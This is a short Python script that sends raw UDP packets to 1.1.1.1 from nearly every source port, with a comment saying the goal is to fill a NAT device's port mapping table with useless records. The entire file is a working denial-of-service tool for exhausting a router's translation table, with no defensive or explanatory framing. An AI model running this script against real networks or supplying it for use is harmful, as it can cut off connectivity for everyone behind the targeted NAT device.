#!/usr/bin/python
from socket import *
import struct

#The goal is to completely fill the NAT port mapping table with useless port/ip records

s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
data = 'random'

dport = 7979 #arbitrary destination port
length = 8+len(data);
checksum = 0

#port range from 0 to 60999
for sport in range(0, 60999):
    udp_header = struct.pack('!HHHH', sport, dport, length, checksum)
    s.sendto(udp_header+data, ('1.1.1.1', 0));